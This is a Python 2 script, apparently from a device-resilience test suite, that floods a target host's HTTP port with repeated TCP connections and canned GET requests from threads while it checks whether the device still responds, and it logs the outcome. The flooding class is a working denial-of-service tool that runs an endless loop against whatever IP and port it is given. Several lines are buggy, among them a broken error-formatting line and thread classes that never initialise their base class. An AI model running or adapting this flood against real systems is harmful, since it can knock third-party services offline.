# This is the main DOS group code
# First it will generate GalileoHTTPFlood (Denial of service) attack on the device while checking if
# the device responds correctly
import socket
import pickle
from time import sleep
import threading

global data_log
lock = threading.Lock()


class Communicator(threading.Thread):
    def __init__(self, _ip, _port):
        self.partner_ip = _ip
        self.port = int(_port)
        self.data = "AAAA"
        """
        GET http://192.168.1.30:8080/weather/\r\n
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
        X-DevTools-Emulate-Network-Conditions-Client-Id: 168D3B43-9079-4DE6-B719-02D5E0CE4114\r\n
        Upgrade-Insecure-Requests: 1\r\n
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\r\n
        Accept-Encoding: gzip, deflate, sdch\r\n
        Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4\r\n
        """

    def communicate(self):
        try:
            index = 0
            count = -1
            for index in range(10):
                communicator_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                communicator_socket.connect((self.partner_ip, self.port ))
                # communicator_socket.send(self.data)
                # receive_data = communicator_socket.recv()
                # print receive_data
                count += 1
                communicator_socket.close()
                sleep(1)
            if count == index:
                data_log.write("debug Successful - The device can respond while being flooded\n")
                return True
            else:
                data_log.write("debug FAIL!!! - The device cannot respond while being flooded\n")
                return False
        except socket.error, e:
            str_e = "e" % e
            data_log.write(str_e)
            data_log.write("debug Communication Failed, The device can respond while being flooded\n")
            return False


class SimpleDOSCannon(threading.Thread):
    def __init__(self, _ip, _port):
        self.target_ip = _ip
        self.port = int(_port)
        self.data = """GET http://192.168.1.30:8080/weather/\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
X-DevTools-Emulate-Network-Conditions-Client-Id: 168D3B43-9079-4DE6-B719-02D5E0CE4114\r\n
Upgrade-Insecure-Requests: 1\r\n
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\r\n
Accept-Encoding: gzip, deflate, sdch\r\n
Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4\r\n"""

    def attack(self):
        msg = str.encode(self.data)
        index = 0
        while True:
            try:
                #  sleep(1)
                index += 1
                # if index % 100 == 0:
                #     print index
                cannon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                cannon_socket.connect((self.target_ip, self.port))
                cannon_socket.send(msg)
                # receive_data = cannon_socket.recv(512)
                # print receive_data
                cannon_socket.close()
                del cannon_socket
            except socket.error, e:
                print e
                cannon_socket.shutdown(socket.SHUT_RDWR)
                cannon_socket.close()
                del cannon_socket
                print "Thread has failed!!!"

    def set_target(self, _target):
        self.target_ip = _target

    def aim_at_target(self):
        cannon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            cannon_socket.connect((self.target_ip, self.port))
            cannon_socket.send("Hello")
        except (IOError, socket.error, socket.herror) as e:
            print e


def collect_param():
    # param_file = open('../parameters', 'rb')   # for debug purposes
    param_file = open('Groups//parameters', 'rb')
    param_list = pickle.load(param_file)
    param_file.close()
    return param_list


def parse_param(param_list):
    parsed_param = {}
    for item in param_list:
        parsed_param[item[0]] = item[1]
    return parsed_param


def thread_routine(_parsed_parameters_main):
    cannon = SimpleDOSCannon(_ip=_parsed_parameters_main['_IP'], _port=_parsed_parameters_main['_Port'])
    cannon.aim_at_target()
    cannon.attack()


def tcp_packet(_port):
    src = 0x1111
    dst = hex(_port)


if __name__ == "__main__":
    data_log = open("Groups//GalileoHTTPFlood//data_log", 'w')
    data_log.write("********************** GalileoHTTPFlood test **********************\n")
    parameters = collect_param()
    parsed_parameters_main = parse_param(parameters)
    data_log.write("debug Parameters Parsed Successfully\n")
    com = Communicator(_ip=parsed_parameters_main["_IP"], _port=parsed_parameters_main["_Port"])
    if com.communicate() is False:
        data_log.write("Cannot initiate communication at all\n Exists test\n")
        exit(1)

    for NUM_CANNON in range(1, 2):
        data_log.write("Test device resistance to tcp flood of %s Cannons\n" % NUM_CANNON)
        th = ['']*NUM_CANNON
        for i in range(NUM_CANNON):
            th[i] = threading.Thread(target=thread_routine, args=(parsed_parameters_main, ))
            th[i].start()
        sleep(5)
        if com.communicate() is False:
            data_log.write("Could resist up to %s Cannons\n" % (NUM_CANNON - 1))
            data_log.write("GalileoHTTPFlood Test Finished\n")
            exit(0)
        else:
            data_log.write("Device Resisted %s Cannons\n" % NUM_CANNON)
    data_log.write("Test Finished Correctly")
    data_log.close()
    exit(0)



